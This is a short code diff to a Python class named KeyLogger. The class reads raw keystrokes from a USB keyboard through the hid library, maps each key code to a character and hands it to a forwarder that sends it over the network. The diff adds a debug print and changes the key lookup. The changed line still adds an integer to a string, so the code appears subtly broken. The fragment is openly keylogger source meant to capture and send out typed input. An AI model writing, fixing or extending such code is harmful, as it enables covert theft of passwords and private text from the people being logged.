@@ -75,7 +75,7 @@ class KeyLogger:
         # #RGB Broken Keyboard
         # id_vendor = 0x046d
         # device_id = 0xc33e
-
+        print(self.keyboard_layout)
         keyboard = hid.device()
         keyboard.open(id_vendor, device_id)
         while True:
@@ -87,7 +87,7 @@ class KeyLogger:
             if data:
                 key_code = data[2]  # The key code is in byte 2
                 try:
-                    char: str = self.keyboard_layout[key_code] + key_code
+                    char: str = self.keyboard_layout[str(key_code)] + key_code
                     try:
                         self.__forwarder.send_over_network(data=char)
                         # write data in file
